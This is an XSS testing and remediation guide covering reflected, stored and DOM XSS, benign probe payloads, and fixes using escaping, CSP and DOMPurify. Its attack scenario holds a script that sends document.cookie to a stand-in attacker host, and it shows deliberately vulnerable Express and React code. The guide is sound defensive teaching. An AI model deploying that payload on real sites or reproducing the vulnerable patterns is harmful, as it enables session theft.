# Cross-Site Scripting (XSS) Testing & Remediation Guide

## 1. What is the Vulnerability?

Cross-Site Scripting (XSS) occurs when a web application processes user-supplied data and includes it in web pages delivered to other users without adequate validation, sanitization, or contextual output encoding. This enables an attacker to inject client-side scripts (typically JavaScript) that execute in the context of the victim's browser session.

## 2. How Does it Work?

1. **Reflected XSS:** The injected payload is carried within the immediate HTTP request (e.g., query string parameter, form input) and reflected in the immediate response by the server.
2. **Stored XSS:** The malicious input is permanently stored in a database, message forum, comment field, or log file. Whenever users view the stored entity, the payload executes.
3. **DOM-based XSS:** The vulnerability exists entirely within client-side code where unsafe JavaScript sinks (such as `innerHTML`, `document.write`, or `eval`) receive untrusted data from DOM sources (such as `location.search`, `location.hash`, or `document.referrer`).

## 3. Why Does it Happen?

- Direct concatenation of user strings into HTML bodies, attributes, or script tags.
- Confusion between raw executable HTML and textual data.
- Use of dangerous DOM APIs in frontend frameworks (e.g. `dangerouslySetInnerHTML` in React or raw `element.innerHTML` in vanilla JavaScript).
- Absence of defense-in-depth headers such as `Content-Security-Policy`.

## 4. Realistic Attack Scenario

An attacker crafts a URL containing a reflected script payload:
```text
https://example.com/search?q=<script>fetch('https://attacker.test/steal?c='+document.cookie)</script>
```
When a logged-in user clicks this link via a phishing email or forum message, the application echoes the unescaped script. The victim's browser executes the script under the legitimate domain, transmitting sensitive session cookies or anti-CSRF tokens to the attacker.

## 5. Vulnerable Code Examples

### Express.js (Reflected XSS)
```javascript
// VULNERABLE: Direct string interpolation into HTML response
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${query}</h1>
      </body>
    </html>
  `);
});
```

### React.js (Unsafe DOM Insertion)
```jsx
// VULNERABLE: Unsanitized HTML rendering
function CommentView({ userComment }) {
  return (
    <div className="comment-box">
      {/* dangerouslySetInnerHTML bypasses React's automatic string escaping */}
      <div dangerouslySetInnerHTML={{ __html: userComment.content }} />
    </div>
  );
}
```

## 6. Safe Testing Payloads

These safe non-destructive payloads verify reflection and attribute breakout without triggering harmful external actions:

| ID | Payload | Purpose |
| :--- | :--- | :--- |
| `XSS-REFLECT-001` | `<test-xss-sentinel>xss_probe_01</test-xss-sentinel>` | Verifies HTML body tag reflection. |
| `XSS-REFLECT-002` | `"><img src=x onerror=console.log('xss_probe_02')>` | Verifies attribute breakout. |
| `XSS-DOM-001` | `#<span id=dom_test_probe>dom_probe_03</span>` | Tests DOM hash sink processing. |

## 7. Testing Methodology

1. **Locate Input Vectors:** Identify all query parameters, form fields, HTTP headers, and URL paths echoed in the response.
2. **Submit Benign Sentinel:** Transmit a distinctive, safe token (e.g. `<test-sentinel-xyz>`).
3. **Inspect Raw Response:** Verify whether `<` and `>` are encoded as `&lt;` and `&gt;`.
4. **Context Check:** Determine whether injection resides in HTML body, inside an HTML attribute (`value="..."`), inside a script tag (`<script>var x = '...';</script>`), or in a URL attribute (`href="..."`).

## 8. Expected Results

- **Vulnerable:** The response body contains literal unencoded characters `<test-sentinel-xyz>` or active attributes.
- **Secure:** Output is contextually escaped (e.g. `&lt;test-sentinel-xyz&gt;`) or Content-Type is set to `application/json`.

## 9. How to Fix It (Remediation)

1. **Context-Aware Encoding:** Use contextual escaping for HTML body, HTML attributes, JavaScript variables, and CSS properties.
2. **Use Safe Framework Defaults:** In React, render dynamic strings directly inside JSX (`<div>{userComment.content}</div>`) which automatically entity-escapes values.
3. **Content-Security-Policy (CSP):** Enforce strict CSP to disallow inline scripts (`'unsafe-inline'`).
4. **Sanitize if Rich Text is Required:** Use a vetted sanitizer such as `DOMPurify` or `sanitize-html`.

## 10. Secure Code Examples

### Express.js (Contextual Encoding & Helmet)
```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// Apply Content-Security-Policy and protective headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      objectSrc: ["'none'"]
    }
  }
}));

function escapeHtml(str) {
  if (typeof str !== 'string') return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

app.get('/search', (req, res) => {
  const query = req.query.q || '';
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(`
    <html>
      <body>
        <h1>Search Results for: ${escapeHtml(query)}</h1>
      </body>
    </html>
  `);
});
```

### React.js (Safe Rendering & DOMPurify)
```jsx
import React from 'react';
import DOMPurify from 'dompurify';

// Safe standard JSX rendering
export function SafeComment({ comment }) {
  return <div>{comment.text}</div>; // Automatically escaped by React
}

// Safe rich-text rendering with DOMPurify
export function SafeRichComment({ richHtmlContent }) {
  const clean = DOMPurify.sanitize(richHtmlContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });

  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

## 11. OWASP References
- [OWASP Top 10:2021 – A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## 12. Testing Checklist
- [ ] All reflected search and filter parameters use contextual output encoding.
- [ ] User comments and forum posts sanitize HTML before rendering.
- [ ] React codebase contains no unescaped `dangerouslySetInnerHTML` with untrusted data.
- [ ] Content-Security-Policy is deployed with `script-src 'self'`.
- [ ] Cookies storing authentication tokens include the `HttpOnly` attribute.
